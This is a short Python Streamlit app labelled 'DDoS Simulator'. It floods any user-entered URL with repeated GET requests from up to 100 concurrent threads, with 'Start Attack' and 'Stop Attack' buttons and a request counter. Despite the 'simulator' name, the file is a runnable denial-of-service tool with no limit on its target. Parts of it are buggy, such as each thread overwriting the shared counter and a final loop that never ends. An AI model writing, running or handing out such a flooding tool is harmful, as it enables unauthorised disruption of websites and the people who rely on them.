import streamlit as st
import requests
import threading
import time

def send_requests(url, stop_event):
    count = 0
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            count += 1
            st.session_state.request_count = count
        except Exception as e:
            st.error(f"Error: {e}")
        time.sleep(0.1)

st.title("DDoS Simulator")

url = st.text_input("Enter target URL:")
num_threads = st.slider("Number of threads", 1, 100, 10)

if 'request_count' not in st.session_state:
    st.session_state.request_count = 0

if 'stop_event' not in st.session_state:
    st.session_state.stop_event = threading.Event()

start_button = st.button("Start Attack")
stop_button = st.button("Stop Attack")

request_count_placeholder = st.empty()

if start_button:
    st.session_state.stop_event.clear()
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests, args=(url, st.session_state.stop_event))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    st.warning("Attack started. Click 'Stop Attack' to end.")

if stop_button:
    st.session_state.stop_event.set()
    st.success("Attack stopped.")

while True:
    request_count_placeholder.text(f"Requests sent: {st.session_state.request_count}")
    time.sleep(1)
